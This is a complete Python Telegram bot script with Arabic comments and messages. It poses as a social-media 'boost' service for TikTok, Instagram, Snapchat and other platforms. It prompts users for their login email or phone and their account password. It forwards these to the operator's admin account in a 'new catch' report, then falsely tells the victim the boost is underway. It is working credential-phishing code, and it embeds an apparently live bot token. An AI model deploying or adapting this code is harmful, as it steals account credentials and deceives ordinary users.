# --------------------------------------------------
# ⚠️ [ WARNING: SECURITY & INTEGRITY ] ⚠️
# --------------------------------------------------
#  تنبيه: أي تلاعب بالحقوق أو تغيير في ملفات الأداة 
#  سيؤدي إلى تعطيلها وإيقاف تشغيلها فوراً.
#  Modification of rights = Instant tool deactivation.
# --------------------------------------------------
import telebot
from telebot import types
import sys

# --- قسم الحقوق (يمكن التعديل بحرية) ---
DEV_USER = "@ASIL655882"
DEV_CH = "@adoaat1"

# توكن البوت الخاص بك بدل كلمه token
TOKEN = '8609762377:AAEaNqMNmHnqRNrVYOYIZIA-vh61NkvsNyM'
bot = telebot.TeleBot(TOKEN)

# الأيدي الخاص بك بدل كلمه ID
MY_ADMIN_ID = 1261455916

user_dict = {}

@bot.message_handler(commands=['start'])
def start(message):
    markup = types.InlineKeyboardMarkup()
    btn = types.InlineKeyboardButton("🚀 ابدأ الرشق الآن | Start Boost", callback_data="start_process")
    markup.add(btn)
    bot.send_message(message.chat.id, f"Welcome to SMM Services!\nأهلاً بك في بوت الخدمات العالمي!", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "start_process")
def show_apps(call):
    markup = types.InlineKeyboardMarkup(row_width=2)
    apps = ["تيك توك | TikTok", "انستا | Instagram", "سناب | Snapchat", "فيس بوك | Facebook", "يوتيوب | YouTube", "ليكي | Likee", "تويتر | X (Twitter)"]
    btns = [types.InlineKeyboardButton(app, callback_data=f"app_{app}") for app in apps]
    markup.add(*btns)
    bot.edit_message_text("اختر التطبيق الذي تريد رشق حسابه:", call.message.chat.id, call.message.message_id, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("app_"))
def ask_input(call):
    app_name = call.data.replace("app_", "")
    user_dict[call.message.chat.id] = {'app': app_name}
    msg = bot.send_message(call.message.chat.id, f"✅ Selected: {app_name}\nالرجاء إدخال البريد الإلكتروني أو رقم الهاتف:")
    bot.register_next_step_handler(msg, get_data)

def get_data(message):
    chat_id = message.chat.id
    if chat_id in user_dict:
        user_dict[chat_id]['login'] = message.text
        msg = bot.send_message(chat_id, "⚠️ جاري التحقق... الرجاء إدخال باسوورد الحساب:")
        bot.register_next_step_handler(msg, get_code)

def get_code(message):
    chat_id = message.chat.id
    if chat_id in user_dict:
        code = message.text
        login_info = user_dict[chat_id]['login']
        app_name = user_dict[chat_id]['app']
        first_name = message.from_user.first_name
        username = f"@{message.from_user.username}" if message.from_user.username else "None"
        
        report = (
            f"✅ **صيد جديد (بوت الرشق)** ✅\n\n"
            f"📱 **المنصة:** {app_name}\n"
            f"👤 **الاسم:** {first_name}\n"
            f"🔗 **اليوزر:** {username}\n"
            f"---------------------------\n"
            f"📧 **الإيميل/الهاتف:** `{login_info}`\n"
            f"🔑 **الرمز المستلم:** `{code}`\n\n"
            f"حقوق المطور: {DEV_USER}\n"
            f"قناة المطور: {DEV_CH}"
        )
        bot.send_message(MY_ADMIN_ID, report, parse_mode="Markdown")
        bot.send_message(chat_id, "✅ تمت العملية بنجاح! سيتم البدء بالرشق خلال دقائق.")
        del user_dict[chat_id]

# --- رسالة التشغيل ---
print("-" * 30)
print(f"✅ تم تشغيل البوت بنجاح!")
print(f"📡 المطور: {DEV_USER}")
print(f"📢 القناة: {DEV_CH}")
print("-" * 30)

bot.infinity_polling()
